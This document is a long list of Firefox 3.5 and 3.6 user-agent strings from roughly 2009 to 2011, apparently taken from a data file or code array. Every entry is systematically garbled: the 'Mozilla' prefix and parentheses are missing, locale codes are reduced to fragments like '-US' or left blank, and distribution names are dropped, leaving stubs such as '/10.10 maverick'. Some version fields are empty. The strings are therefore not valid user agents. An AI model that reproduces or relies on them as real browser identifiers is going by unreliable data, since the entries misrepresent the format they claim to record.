	"/5.0 Macintosh; U; Intel Mac OS X 10.6; fr; rv:1.9.2.23 Gecko/20110920 Firefox/3.6.23"
	"/5.0 Macintosh; U; PPC Mac OS X 10.4; -US; rv:1.9.2.22 Gecko/20110902 Firefox/3.6.22"
	"/5.0 Macintosh; U; Intel Mac OS X 10.5; ; rv:1.9.2.22 Gecko/20110902 Firefox/3.6.22"
	"/5.0 X11; U; Linux i686; ; rv:1.9.2.21 Gecko/20110830 /10.10 maverick Firefox/3.6.21"
	"/5.0 X11; U; OpenBSD i386; -US; rv:1.9.2.20 Gecko/20110803 Firefox/3.6.20"
	"/5.0 X11; U; Linux x86_64; ; rv:1.9.2.20 Gecko/20110805 /10.04  Firefox/3.6.20"
	"/5.0 X11; U; Linux x86_64; -US; rv:1.9.2.20 Gecko/20110804  /3.6-2.el5 Firefox/3.6.20"
	"/5.0 Windows; U; Windows NT 6.0; ; rv:1.9.2.20 Gecko/20110803 Firefox/3.6.20"
	"/5.0 Windows; U; Windows NT 6.0; ; rv:1.9.2.20 Gecko/20110803 Firefox/3.6.20"
	"/5.0 Windows; U; Windows NT 5.2; -US; rv:1.9.2.20 Gecko/20110803 Firefox/3.6.20  .NET CLR 3.5.30729; .NET4.0E"
	"/5.0 Windows; U; Windows NT 5.1; ; rv:1.9.2.20 Gecko/20110803 Firefox/3.6.20 .NET CLR 3.5.30729"
	"/5.0 Windows; U; Windows NT 5.1; -US; rv:1.9.2.20 Gecko/20110803 AskTbFWV5/3.13.0.17701 Firefox/3.6.20  .NET CLR 3.5.30729"
	"/5.0 Windows; U; Windows NT 5.1; cs; rv:1.9.2.20 Gecko/20110803 Firefox/3.6.20"
	"/5.0 Macintosh; U; Intel Mac OS X 10.5; -US; rv:1.9.2.20 Gecko/20110803 Firefox/3.6.20"
	"/5.0 X11; U; Linux i686; fr; rv:1.9.2.2 Gecko/20100316 Firefox/3.6.2"
	"/5.0 Windows; U; Windows NT 6.1; fr; rv:1.9.2.2 Gecko/20100316 Firefox/3.6.2 GTB7.0"
	"/5.0 Windows; U; Windows NT 6.1; -US; rv:1.9.2.2 Gecko/20100316 AskTbSPC2/3.9.1.14019 Firefox/3.6.2"
	"/5.0 Windows; U; Windows NT 6.0; -US; rv:1.9.2.2 Gecko/20100316 Firefox/3.6.2 .NET CLR 3.5.30729"
	"/5.0 Windows; U; Windows NT 5.1; ; rv:1.9.2.2 Gecko/20100316 Firefox/3.6.2  .NET CLR 3.5.30729"
	"/5.0 Windows; U; Windows NT 5.1; pl; rv:1.9.2.2 Gecko/20100316 Firefox/3.6.2 GTB6 .NET CLR 3.5.30729"
	"/5.0 Windows; U; Windows NT 5.1; ; rv:1.9.2.2 Gecko/20100316 Firefox/3.6.2  .NET CLR 3.0.04506.648"
	"/5.0 Windows; U; Windows NT 5.1; ; rv:1.9.2.2 Gecko/20100316 Firefox/3.6.2  .NET CLR 3.0.04506.30"
	"/5.0 Macintosh; U; Intel Mac OS X 10.7; -US; rv:1.9.2.2 Gecko/20100316 Firefox/3.6.2"
	"/5.0 X11; U; Linux i686; -US; rv: Gecko/20100902 /9.10 karmic Firefox/"
	"/5.0 Windows; U; Windows NT 6.0; ; rv:1.9.2.20 Gecko/20110803 Firefox/3.6.19"
	"/5.0 Macintosh; U; PPC Mac OS X 10.4; -GB; rv:1.9.2.19 Gecko/20110707 Firefox/3.6.19"
	"/5.0 X11; U; Linux x86_64; ; rv:1.9.2.18 Gecko/20110628 /10.10 maverick Firefox/3.6.18"
	"/5.0 X11; U; Linux i686; pl; rv:1.9.2.18 Gecko/20110614 Firefox/3.6.18  .NET CLR 3.5.30729; .NET4.0E"
	"/5.0 X11; U; Linux i686; -GB; rv:1.9.2.18 Gecko/20110628 /10.10 maverick Firefox/3.6.18"
	"/5.0 X11; U; Linux i686; ; rv:1.9.2.18 Gecko/20110628 /10.10 maverick Firefox/3.6.18"
	"/5.0 X11; U; Linux i686; ; rv:1.9.2.18 Gecko/20110615 /10.10 maverick Firefox/3.6.18"
	"/5.0 Windows; U; Windows NT 6.1; -BR; rv:1.9.2.18 Gecko/20110614 Firefox/3.6.18 .NET CLR 3.5.30729"
	"/5.0 Windows; U; Windows NT 6.1; ar; rv:1.9.2.18 Gecko/20110614 Firefox/3.6.18"
	"/5.0 Windows; U; Windows NT 6.0; -BR; rv:1.9.2.18 Gecko/20110614 Firefox/3.6.18 .NET CLR 3.5.30729"
	"/5.0 Windows; U; Windows NT 6.0; -GB; rv:1.9.2.18 Gecko/20110614 Firefox/3.6.18  .NET CLR 3.5.30729; .NET4.0E"
	"/5.0 X11; U; Linux i686 x86_64; -GB; rv:1.9.2.17 Gecko/20110420 Firefox/3.6.17"
	"/5.0 X11; Linux i686  x86_64; rv:5.0 Gecko/20100101 Firefox/3.6.17 Firefox/3.6.17"
	"/5.0 Windows; U; Windows NT 6.0; -US; rv:1.9.2.17 Gecko/20110420 Firefox/3.6.17"
	"/5.0 Windows; U; Windows NT 5.1; tr; rv:1.9.2.17 Gecko/20110420 Firefox/3.6.17"
	"/5.0 Windows; U; Windows NT 5.1; sl; rv:1.9.2.17 Gecko/20110420 Firefox/3.6.17  .NET CLR 3.5.30729"
	"/5.0 Windows; U; Windows NT 5.1; -BR; rv:1.9.2.17 Gecko/20110420 Firefox/3.6.17 .NET CLR 3.5.30729"
	"/5.0 Windows; U; Windows NT 5.1; ; rv:1.9.2.17 Gecko/20110420 Firefox/3.6.17  .NET CLR 3.5.30729; .NET4.0E"
	"/5.0 Windows; U; Windows NT 5.1; ; rv:1.9.2.17 Gecko/20110420 Firefox/3.6.17 .NET CLR 3.5.30729"
	"/5.0 Windows; U; Windows NT 5.1; fr; rv:1.9.2.17 Gecko/20110420 Firefox/3.6.17  .NET CLR 3.5.30729; .NET4.0E"
	"/5.0 X11; U; Linux x86_64; -JP; rv:1.9.2.16 Gecko/20110323 /10.10 maverick Firefox/3.6.16"
	"/5.0 X11; U; Linux i686; -US; rv:1.9.2.16 Gecko/20110323 /9.10 karmic Firefox/3.6.16 FirePHP/0.5"
	"/5.0 X11; U; Linux i686; -GB; rv:1.9.2.16 Gecko/20110319 Firefox/3.6.16"
	"/5.0 Windows; U; Windows NT 6.1; fr; rv:1.9.2.16 Gecko/20110319 Firefox/3.6.16"
	"/5.0 Windows; U; Windows NT 6.0; pl; rv:1.9.2.16 Gecko/20110319 Firefox/3.6.16"
	"/5.0 Windows; U; Windows NT 5.1; ko; rv:1.9.2.16 Gecko/20110319 Firefox/3.6.16  .NET CLR 3.5.30729; .NET4.0E"
	"/5.0 Windows; U; Windows NT 5.1; fr; rv:1.9.2.16 Gecko/20110319 Firefox/3.6.16  .NET CLR 3.5.30729"
	"/5.0 Windows; U; Windows NT 5.1; ; rv:1.9.1.13 Gecko/20100914 Firefox/3.6.16"
	"/5.0 Windows; U; Windows NT 5.1; -GB; rv:1.9.2.16 Gecko/20110319 AskTbUTR/3.11.3.15590 Firefox/3.6.16"
	"/5.0 X11; U; Linux i686; -US; rv: Gecko/20110304 /10.10 maverick Firefox/"
	"/5.0 X11; U; Linux i686; nl; rv:1.9.2.15 Gecko/20110303 /8.04 hardy Firefox/3.6.15"
	"/5.0 X11; U; Linux i686; -US; rv:1.9.2.15 Gecko/20110303 /10.04  Firefox/3.6.15 FirePHP/0.5"
	"/5.0 X11; U; Linux i686; ; rv:1.9.2.15 Gecko/20110330 CentOS/3.6-1.el5.centos Firefox/3.6.15"
	"/5.0 Windows; U; Windows NT 6.1; es-ES; rv:1.9.2.15 Gecko/20110303 Firefox/3.6.15"
	"/5.0 Windows; U; Windows NT 6.1; -US; rv:1.9.2.15 Gecko/20110303 Firefox/3.6.15  .NET CLR 3.5.30729; .NET4.0C FirePHP/0.5"
	"/5.0 Windows; U; Windows NT 6.0; -GB; rv:1.9.2.15 Gecko/20110303 AskTbBT4/3.11.3.15590 Firefox/3.6.15  .NET CLR 3.5.30729; .NET4.0C"
	"/5.0 Windows; U; Windows NT 5.1; -US; rv:1.9.2.15 Gecko/20110303 Firefox/3.6.15 .NET CLR 3.5.30729"
	"/5.0 X11; U; Linux i686; -US; rv: Gecko/20110105 Firefox/"
	"/5.0 X11; U; Linux armv7l; -US; rv:1.9.2.14 Gecko/20110224 Firefox/3.6.14 MB860/.MX"
	"/5.0 Windows; U; Windows NT 6.1; zh-CN; rv:1.9.2.14 Gecko/20110218 Firefox/3.6.14"
	"/5.0 Windows; U; Windows NT 6.1; -AU; rv:1.9.2.14 Gecko/20110218 Firefox/3.6.14"
	"/5.0 Windows; U; Windows NT 5.1; -GB; rv:1.9.2.14 Gecko/20110218 Firefox/3.6.14 GTB7.1  .NET CLR 3.5.30729"
	"/5.0 Windows; U; Windows NT 5.1; ; rv:1.9.2.13 Firefox/3.6.13"
	"/5.0 X11; U; Linux x86_64; pl-PL; rv:1.9.2.13 Gecko/20101206 /10.04  Firefox/3.6.13"
	"/5.0 X11; U; Linux x86_64; nb-NO; rv:1.9.2.13 Gecko/20101206 /10.04  Firefox/3.6.13"
	"/5.0 X11; U; Linux x86_64; ; rv:1.9.2.13 Gecko/20101206 /10.04  Firefox/3.6.13 .NET CLR 3.5.30729"
	"/5.0 X11; U; Linux x86_64; fr; rv:1.9.2.13 Gecko/20110103 /3.6.13-1.fc14 Firefox/3.6.13"
	"/5.0 X11; U; Linux x86_64; fr; rv:1.9.2.13 Gecko/20101203 Firefox/3.6.13"
	"/5.0 X11; U; Linux x86_64; -US; rv:1.9.2.13 Gecko/20101223 Gentoo Firefox/3.6.13"
	"/5.0 X11; U; Linux x86_64; -US; rv:1.9.2.13 Gecko/20101219 Gentoo Firefox/3.6.13"
	"/5.0 X11; U; Linux x86_64; -US; rv:1.9.2.13 Gecko/20101206  /3.6-3.el4 Firefox/3.6.13"
	"/5.0 X11; U; Linux x86_64; -US; rv:1.9.2.13 Gecko/20101206 Firefox/3.6.13"
	"/5.0 X11; U; Linux x86_64; -NZ; rv:1.9.2.13 Gecko/20101206 /10.10 maverick Firefox/3.6.13"
	"/5.0 X11; U; Linux x86_64; -GB; rv:1.9.2.13 Gecko/20101206 /9.10 karmic Firefox/3.6.13"
	"/5.0 X11; U; Linux x86_64; -GB; rv:1.9.2.13 Gecko/20101206  /3.6-2.el5 Firefox/3.6.13"
	"/5.0 X11; U; Linux x86_64; -DK; rv:1.9.2.13 Gecko/20101206 /10.10 maverick Firefox/3.6.13"
	"/5.0 X11; U; Linux MIPS32 1074Kf CPS ; -US; rv:1.9.2.13 Gecko/20110103 /3.6.13-1.fc14 Firefox/3.6.13"
	"/5.0 X11; U; Linux i686; ; rv:1.9.2.13 Gecko/20101206 /10.10 maverick Firefox/3.6.13"
	"/5.0 X11; U; Linux i686; -BR; rv:1.9.2.13 Gecko/20101209 /3.6.13-1.fc13 Firefox/3.6.13"
	"/5.0 X11; U; Linux i686; es-ES; rv:1.9.2.13 Gecko/20101206 /9.10 karmic Firefox/3.6.13"
	"/5.0 X11; U; Linux i686; ; rv:1.9.2.13 Gecko/20101209 CentOS/3.6-2.el5.centos Firefox/3.6.13"
	"/5.0 X11; U; Linux i686; ; rv:1.9.2.13 Gecko/20101206 /10.10 maverick Firefox/3.6.13"
	"/5.0 X11; U; NetBSD i386; -US; rv:1.9.2.12 Gecko/20101030 Firefox/3.6.12"
	"/5.0 X11; U; Linux x86_64; es-MX; rv:1.9.2.12 Gecko/20101027 /10.04  Firefox/3.6.12"
	"/5.0 X11; U; Linux x86_64; es-ES; rv:1.9.2.12 Gecko/20101027 /3.6.12-1.fc13 Firefox/3.6.12"
	"/5.0 X11; U; Linux x86_64; es-ES; rv:1.9.2.12 Gecko/20101026 SUSE/3.6.12-0.7.1 Firefox/3.6.12"
	"/5.0 X11; U; Linux x86_64; -US; rv:1.9.2.12 Gecko/20101102 Gentoo Firefox/3.6.12"
	"/5.0 X11; U; Linux x86_64; -US; rv:1.9.2.12 Gecko/20101102 Firefox/3.6.12"
	"/5.0 X11; U; Linux ppc; fr; rv:1.9.2.12 Gecko/20101027 /10.10 maverick Firefox/3.6.12"
	"/5.0 X11; U; Linux i686; ko-KR; rv:1.9.2.12 Gecko/20101027 /10.10 maverick Firefox/3.6.12"
	"/5.0 X11; U; Linux i686; -US; rv:1.9.2.12 Gecko/20101114 Gentoo Firefox/3.6.12"
	"/5.0 X11; U; Linux i686; -GB; rv:1.9.2.12 Gecko/20101027 /10.10 maverick Firefox/3.6.12 GTB7.1"
	"/5.0 X11; U; Linux i686; ; rv:1.9.2.12 Gecko/20101027 /3.6.12-1.fc13 Firefox/3.6.12"
	"/5.0 X11; FreeBSD x86_64; rv:2.0 Gecko/20100101 Firefox/3.6.12"
	"/5.0 Windows; U; Windows NT 6.1; zh-CN; rv:1.9.2.12 Gecko/20101026 Firefox/3.6.12  .NET CLR 3.5.30729; .NET4.0E"
	"/5.0 Windows; U; Windows NT 6.0; sv-SE; rv:1.9.2.12 Gecko/20101026 Firefox/3.6.12"
	"/5.0 Windows; U; Windows NT 6.0; -US; rv:1.9.2.12 Gecko/20101026 Firefox/3.6.12 .NET CLR 2.0.50727; .NET CLR 3.0.30729; .NET CLR 3.5.30729; .NET CLR 3.5.21022"
	"/5.0 Macintosh; U; Intel Mac OS X 10.6; ; rv:1.9.2.12 Gecko/20101026 Firefox/3.6.12 GTB5"
	"/5.0 X11; U; Linux x86_64; ; rv:1.9.2.11 Gecko/20101028 CentOS/3.6-2.el5.centos Firefox/3.6.11"
	"/5.0 X11; U; Linux armv7l; -GB; rv: Gecko/20100723 Firefox/3.6.11"
	"/5.0 Windows; U; Windows NT 5.2; ; rv:1.9.2.11 Gecko/20101012 Firefox/3.6.11"
	"/5.0 Windows; U; Windows NT 5.2;  rv:1.9.2.11 Gecko/20101012 Firefox/3.6.11"
	"/5.0 Windows; U; Windows NT 5.1; ; rv:1.9.2.11 Gecko/20101012 Firefox/3.6.11  .NET CLR 3.5.30729"
	"/5.0 X11; U; Linux x86_64; zh-CN; rv:1.9.2.10 Gecko/20100922 /10.10 maverick Firefox/3.6.10"
	"/5.0 X11; U; Linux x86_64; -BR; rv:1.9.2.10 Gecko/20100922 /10.10 maverick Firefox/3.6.10"
	"/5.0 X11; U; Linux x86_64; pl-PL; rv:1.9.2.10 Gecko/20100922 /10.10 maverick Firefox/3.6.10"
	"/5.0 X11; U; Linux x86_64; -US; rv:1.9.2.10 Gecko/20100922 /10.10 maverick Firefox/3.6.10 GTB7.1"
	"/5.0 X11; U; Linux x86_64; el-GR; rv:1.9.2.10 Gecko/20100922 /10.10 maverick Firefox/3.6.10"
	"/5.0 X11; U; Linux x86_64; ; rv:1.9.2.10 Gecko/20100922 /10.10 maverick Firefox/3.6.10 GTB7.1"
	"/5.0 X11; U; Linux x86_64; cs-CZ; rv:1.9.2.10 Gecko/20100915 /10.04  Firefox/3.6.10"
	"/5.0 X11; U; Linux i686; pl-PL; rv:1.9.2.10 Gecko/20100915 /10.04  Firefox/3.6.10"
	"/5.0 X11; U; Linux i686; fr-FR; rv:1.9.2.10 Gecko/20100914 Firefox/3.6.10"
	"/5.0 X11; U; Linux i686; es-AR; rv:1.9.2.10 Gecko/20100922 /10.10 maverick Firefox/3.6.10"
	"/5.0 X11; U; Linux i686; -US; rv:1.9.2.10 Gecko/20100915 /9.04 jaunty Firefox/3.6.10"
	"/5.0 X11; U; Linux i686; -GB; rv:1.9.2.11 Gecko/20101013 /10.10 maverick Firefox/3.6.10"
	"/5.0 X11; U; Linux i686; -CA; rv:1.9.2.10 Gecko/20100922 /10.10 maverick Firefox/3.6.10"
	"/5.0 X11; U; Linux i686; ; rv:1.9.2.10 Gecko/20100922 /10.10 maverick Firefox/3.6.10"
	"/5.0 X11; U; Linux i686; ; rv:1.9.2.10 Gecko/20100915 /9.10 karmic Firefox/3.6.10"
	"/5.0 X11; U; Linux i686; ; rv:1.9.2.10 Gecko/20100915 /10.04  Firefox/3.6.10"
	"/5.0 X11; U; Linux i686; ; rv:1.9.2.10 Gecko/20100914 SUSE/3.6.10-0.3.1 Firefox/3.6.10"
	"/5.0 Windows; U; Windows NT 6.1; ro; rv:1.9.2.10 Gecko/20100914 Firefox/3.6.10"
	"/5.0 Windows; U; Windows NT 6.1; nl; rv:1.9.2.10 Gecko/20100914 Firefox/3.6.10  .NET CLR 3.5.30729"
	"/5.0 Windows; U; Windows NT 6.1; fr; rv:1.9.2.10 Gecko/20100914 Firefox/3.6.10 .NET CLR 3.5.30729"
	"/5.0 X11; U; Linux i686; -US; rv:1.9.2.1 Gecko/20100122 firefox/3.6.1"
	"/5.0 Windows; U; Windows NT 7.0; rv:1.9.2 Gecko/20100101 Firefox/3.6"
	"/5.0 Windows; U; Windows NT 5.2; rv:1.9.2 Gecko/20100101 Firefox/3.6"
	"/5.0 X11; U; x86_64 Linux; en_GB, en_US; rv:1.9.2 Gecko/20100115 Firefox/3.6"
	"/5.0 X11; U; Linux x86_64; -US; rv:1.9.2 Gecko/20100222 /10.04  Firefox/3.6"
	"/5.0 X11; U; Linux x86_64; -US; rv:1.9.2 Gecko/20100130 Gentoo Firefox/3.6"
	"/5.0 X11; U; Linux x86_64; ; rv:1.9.2 Gecko/20100308 /10.04  Firefox/3.6"
	"/5.0 X11; U; Linux i686; -US; rv: Gecko/20100312 /9.04 jaunty Firefox/3.6"
	"/5.0 X11; U; Linux i686; -US; rv:1.9.2 Gecko/20100128 Gentoo Firefox/3.6"
	"/5.0 X11; U; Linux i686; -US; rv:1.9.2 Gecko/20100115 /10.04  Firefox/3.6"
	"/5.0 X11; U; Linux i686; -US; rv:1.9.2 Gecko/20100115 Firefox/3.6 FirePHP/0.4"
	"/5.0 X11; Linux i686; rv:2.0 Gecko/20100101 Firefox/3.6"
	"/5.0 X11; FreeBSD i686 Firefox/3.6"
	"/5.0 Windows; U; Windows NT 6.1; -RU; rv:1.9.2 Gecko/20100105 MRA 5.6  03278 Firefox/3.6 .NET CLR 3.5.30729"
	"/5.0 Windows; U; Windows NT 6.1; ; rv:1.9.2 Gecko/20100115 Firefox/3.6"
	"/5.0 Windows; U; Windows NT 6.1; -US; rv: Gecko/20100306 Firefox3.6 .NET CLR 3.5.30729"
	"/5.0 Windows; U; Windows NT 6.1; -US; rv:1.9.2.8 Gecko/20100806 Firefox/3.6"
	"/5.0 Windows; U; Windows NT 6.1; -US; rv:1.9.2.17 Gecko/20110420 Firefox/3.6"
	"/5.0 Windows; U; Windows NT 6.1; -GB; rv:1.9.2.3 Gecko/20100401 Firefox/3.6;MEGAUPLOAD 1.0"
	"/5.0 Windows; U; Windows NT 6.1; ar; rv:1.9.2 Gecko/20100115 Firefox/3.6"
	"/5.0 Windows; U; Windows NT 6.0; ; rv:1.9.2 Gecko/20100115 Firefox/3.6"
	"/5.0 Windows; U; Windows NT 5.1; -US; rv: Gecko/20090517 Firefox/ .NET CLR 3.5.30729"
	"/5.0 Windows; U; Windows NT 5.1; -US; rv: Gecko/20090409 Firefox/"
	"/5.0 Windows; U; Windows NT 5.1; -US; rv: Gecko/20090401 Firefox/"
	"/5.0 X11; U; Linux i686; nl-NL; rv:1.9.1b4 Gecko/20090423 Firefox/3.5b4"
	"/5.0 Windows; U; Windows NT 6.0; -US; rv:1.9.1b4 Gecko/20090423 Firefox/3.5b4 GTB5 .NET CLR 3.5.30729"
	"/5.0 Windows; U; Windows NT 6.0; -GB; rv:1.9.1b4 Gecko/20090423 Firefox/3.5b4 .NET CLR 3.5.30729"
	"/5.0 Windows; U; Windows NT 5.1; zh-CN; rv:1.9.1b4 Gecko/20090423 Firefox/3.5b4 .NET CLR 3.5.30729"
	"/5.0 Windows; U; Windows NT 5.1; zh-CN; rv:1.9.1b4 Gecko/20090423 Firefox/3.5b4"
	"/5.0 Windows; U; Windows NT 5.1; -US; rv:1.9.1b4 Gecko/20090423 Firefox/3.5b4 .NET CLR 3.5.30729"
	"/5.0 Windows; U; Windows NT 5.1; -GB; rv:1.9.1b4 Gecko/20090423 Firefox/3.5b4"
	"/5.0 Macintosh; U; Intel Mac OS X 10.5; fr; rv:1.9.1b4 Gecko/20090423 Firefox/3.5b4"
	"/5.0 Macintosh; U; Intel Mac OS X 10.5; -US; rv:1.9.1b4 Gecko/20090423 Firefox/3.5b4 GTB5"
	"/5.0 X11; U; Linux x86_64; ; rv:1.9.1.9 Gecko/20100402 /9.10 karmic Firefox/3.5.9 .NET CLR 3.5.30729"
	"/5.0 X11; U; Linux x86_64; ; rv:1.9.1.9 Gecko/20100330 /3.5.9-2.fc12 Firefox/3.5.9"
	"/5.0 X11; U; Linux x86_64; fr; rv:1.9.1.9 Gecko/20100317 SUSE/3.5.9-0.1.1 Firefox/3.5.9 GTB7.0"
	"/5.0 X11; U; Linux x86_64; es-CL; rv:1.9.1.9 Gecko/20100402 /9.10 karmic Firefox/3.5.9"
	"/5.0 X11; U; Linux x86_64; cs-CZ; rv:1.9.1.9 Gecko/20100317 SUSE/3.5.9-0.1.1 Firefox/3.5.9"
	"/5.0 X11; U; Linux i686; nl; rv:1.9.1.9 Gecko/20100401 /9.10 karmic Firefox/3.5.9"
	"/5.0 X11; U; Linux i686; -HU; rv:1.9.1.9 Gecko/20100330 /3.5.9-1.fc12 Firefox/3.5.9"
	"/5.0 X11; U; Linux i686; es-ES; rv:1.9.1.9 Gecko/20100317 SUSE/3.5.9-0.1 Firefox/3.5.9"
	"/5.0 X11; U; Linux i686; -US; rv:1.9.1.9 Gecko/20100401 /9.10 karmic Firefox/3.5.9 GTB7.1"
	"/5.0 X11; U; Linux i686; -US; rv:1.9.1.9 Gecko/20100315 /9.10 karmic Firefox/3.5.9"
	"/5.0 X11; U; Linux i686; -US; rv:1.9.1.4 Gecko/20091028 /9.10 karmic Firefox/3.5.9"
	"/5.0 Windows; U; Windows NT 6.1; tr; rv:1.9.1.9 Gecko/20100315 Firefox/3.5.9 GTB7.1"
	"/5.0 Windows; U; Windows NT 6.1; ; rv:1.9.1.9 Gecko/20100315 Firefox/3.5.9 .NET CLR 3.5.30729"
	"/5.0 Windows; U; Windows NT 6.1; fr; rv:1.9.1.9 Gecko/20100315 Firefox/3.5.9"
	"/5.0 Windows; U; Windows NT 6.1; ; rv:1.9.1.9 Gecko/20100315 Firefox/3.5.9"
	"/5.0 Windows; U; Windows NT 6.1; -US; rv:1.9.1.9 Gecko/20100315 Firefox/3.5.9"
	"/5.0 Windows; U; Windows NT 6.0; nl; rv:1.9.1.9 Gecko/20100315 Firefox/3.5.9  .NET CLR 3.5.30729"
	"/5.0 Windows; U; Windows NT 6.0; es-ES; rv:1.9.1.9 Gecko/20100315 Firefox/3.5.9 GTB5 .NET CLR 3.5.30729"
	"/5.0 Windows; U; Windows NT 6.0; ; rv:1.9.2.13 Gecko/20101203 Firefox/3.5.9 "
	"/5.0 Windows; U; Windows NT 6.0; ; rv:1.9.1.9 Gecko/20100315 Firefox/3.5.9 GTB7.0 .NET CLR 3.0.30618"
	"/5.0 X11; U; Linux x86_64; ; rv:1.9.1.8 Gecko/20100216 /3.5.8-1.fc12 Firefox/3.5.8"
	"/5.0 X11; U; Linux x86_64; es-ES; rv:1.9.1.8 Gecko/20100216 /3.5.8-1.fc11 Firefox/3.5.8"
	"/5.0 X11; U; Linux x86_64; -US; rv:1.9.1.8 Gecko/20100318 Gentoo Firefox/3.5.8"
	"/5.0 X11; U; Linux i686; zh-CN; rv:1.9.1.8 Gecko/20100216 /3.5.8-1.fc12 Firefox/3.5.8"
	"/5.0 X11; U; Linux i686; -JP; rv:1.9.1.8 Gecko/20100216 /3.5.8-1.fc12 Firefox/3.5.8"
	"/5.0 X11; U; Linux i686; es-AR; rv:1.9.1.8 Gecko/20100214 /9.10 karmic Firefox/3.5.8"
	"/5.0 X11; U; Linux i686; ; rv:1.9.1.8 Gecko/20100214 /9.10 karmic Firefox/3.5.8"
	"/5.0 X11; U; Linux i686; ; rv:1.9.1.8 Gecko/20100202 Firefox/3.5.8"
	"/5.0 X11; U; FreeBSD i386; -JP; rv:1.9.1.8 Gecko/20100305 Firefox/3.5.8"
	"/5.0 Windows; U; Windows NT 6.1; sl; rv:1.9.1.8 Gecko/20100202 Firefox/3.5.8"
	"/5.0 Windows; U; Windows NT 6.0; -US; rv:1.9.1.8 Gecko/20100202 Firefox/3.5.8 .NET CLR 3.5.30729 FirePHP/0.4"
	"/5.0 Windows; U; Windows NT 5.1; zh-TW; rv:1.9.1.8 Gecko/20100202 Firefox/3.5.8 GTB6"
	"/5.0 Windows; U; Windows NT 5.1; ; rv:1.9.1.8 Gecko/20100202 Firefox/3.5.8 GTB7.0 .NET CLR 3.5.30729"
	"/5.0 ; U; ; pl; rv:1.9.2.8 Gecko/20100202 Firefox/3.5.8"
	"/5.0 X11; U; Linux x86_64; -US; rv:1.9.2 Gecko/20100305 Gentoo Firefox/3.5.7"
	"/5.0 X11; U; Linux x86_64; cs-CZ; rv:1.9.1.7 Gecko/20100106 /9.10 karmic Firefox/3.5.7"
	"/5.0 X11; U; Linux i686; es-ES; rv:1.9.1.7 Gecko/20091222 SUSE/3.5.7-1.1.1 Firefox/3.5.7"
	"/5.0 Windows; U; Windows NT 6.0; ; rv:1.9.1.7 Gecko/20091221 Firefox/3.5.7 GTB6"
	"/5.0 Windows; U; Windows NT 6.0; ; rv:1.9.1.7 Gecko/20091221 Firefox/3.5.7 .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.30729; .NET CLR 3.5.30729"
	"/5.0 Windows; U; Windows NT 5.2; fr; rv:1.9.1.7 Gecko/20091221 Firefox/3.5.7 .NET CLR 3.0.04506.648"
	"/5.0 Windows; U; Windows NT 5.1; ; rv:1.9.1.7 Gecko/20091221 Firefox/3.5.7"
	"/5.0 Windows; U; Windows NT 5.1; -US; rv:1.9.1.7 Gecko/20091221 MRA 5.5  02842 Firefox/3.5.7 .NET CLR 3.5.30729"
	"/5.0 X11; U; Linux x86_64; fr; rv:1.9.1.6 Gecko/20091215 /9.10 karmic Firefox/3.5.6"
	"/5.0 X11; U; Linux x86_64; -US; rv:1.9.1.6 Gecko/20100117 Gentoo Firefox/3.5.6"
	"/5.0 X11; U; Linux i686; zh-CN; rv:1.9.1.6 Gecko/20091216 /3.5.6-1.fc11 Firefox/3.5.6 GTB6"
	"/5.0 X11; U; Linux i686; es-ES; rv:1.9.1.6 Gecko/20091201 SUSE/3.5.6-1.1.1 Firefox/3.5.6 GTB6"
	"/5.0 X11; U; Linux i686; -US; rv:1.9.1.6 Gecko/20100118 Gentoo Firefox/3.5.6"
	"/5.0 X11; U; Linux i686; -GB; rv:1.9.1.6 Gecko/20091215 /9.10 karmic Firefox/3.5.6 GTB6"
	"/5.0 X11; U; Linux i686; ; rv:1.9.1.6 Gecko/20091215 /9.10 karmic Firefox/3.5.6 GTB7.0"
	"/5.0 X11; U; Linux i686; ; rv:1.9.1.6 Gecko/20091215 /9.10 karmic Firefox/3.5.6"
	"/5.0 X11; U; Linux i686; ; rv:1.9.1.6 Gecko/20091201 SUSE/3.5.6-1.1.1 Firefox/3.5.6"
	"/5.0 X11; U; Linux i686; cs-CZ; rv:1.9.1.6 Gecko/20100107 /3.5.6-1.fc12 Firefox/3.5.6"
	"/5.0 X11; U; Linux i686; ; rv:1.9.1.6 Gecko/20091215 /9.10 karmic Firefox/3.5.6"
	"/5.0 Windows; U; Windows NT 6.1; ; rv:1.9.1.6 Gecko/20091201 Firefox/3.5.6"
	"/5.0 Windows; U; Windows NT 6.1; -US; rv:1.9.1.6 Gecko/20091201 Firefox/3.5.6  .NET CLR 3.5.30729"
	"/5.0 Windows; U; Windows NT 6.0; ; rv:1.9.1.6 Gecko/20091201 Firefox/3.5.6 .NET CLR 3.5.30729"
	"/5.0 Windows; U; Windows NT 6.0; -US; rv:1.9.1.6 Gecko/20091201 MRA 5.4  02647 Firefox/3.5.6 .NET CLR 3.5.30729"
	"/5.0 Windows; U; Windows NT 5.1; nl; rv:1.9.1.6 Gecko/20091201 Firefox/3.5.6 .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729"
	"/5.0 Windows; U; Windows NT 5.1; -US; rv:1.9.1.6 Gecko/20091201 MRA 5.5  02842 Firefox/3.5.6 .NET CLR 3.5.30729"
	"/5.0 Windows; U; Windows NT 5.1; -US; rv:1.9.1.6 Gecko/20091201 MRA 5.5  02842 Firefox/3.5.6"
	"/5.0 Windows; U; Windows NT 5.1; -US; rv:1.9.1.6 Gecko/20091201 Firefox/3.5.6 GTB6 .NET CLR 3.5.30729 FBSMTWB"
	"/5.0 Windows; U; Windows NT 5.1; -US; rv:1.9.1.6 Gecko/20091201 Firefox/3.5.6 .NET CLR 3.5.30729 FBSMTWB"
	"/5.0 X11; U; Linux x86_64; fr; rv:1.9.1.5 Gecko/20091109 /9.10 karmic Firefox/3.5.5"
	"/5.0 X11; U; Linux x86_64; -US; rv: Gecko/20091227 /9.10 karmic Firefox/3.5.5"
	"/5.0 X11; U; Linux x86_64; -US; rv:1.9.1.5 Gecko/20091114 Gentoo Firefox/3.5.5"
	"/5.0 X11; U; Linux i686 x86_64; -US; rv:1.9.1.5 Gecko/20091102 Firefox/3.5.5"
	"/5.0 Windows; U; Windows NT 6.1; uk; rv:1.9.1.5 Gecko/20091102 Firefox/3.5.5"
	"/5.0 Windows; U; Windows NT 6.1; -US; rv:1.9.1.5 Gecko/20091102 MRA 5.5  02842 Firefox/3.5.5"
	"/5.0 Windows; U; Windows NT 6.0; ; rv:1.9.1.5 Gecko/20091102 MRA 5.5  02842 Firefox/3.5.5"
	"/5.0 Windows; U; Windows NT 6.0; -GB; rv:1.9.1.5 Gecko/20091102 Firefox/3.5.5  .NET CLR 3.5.30729"
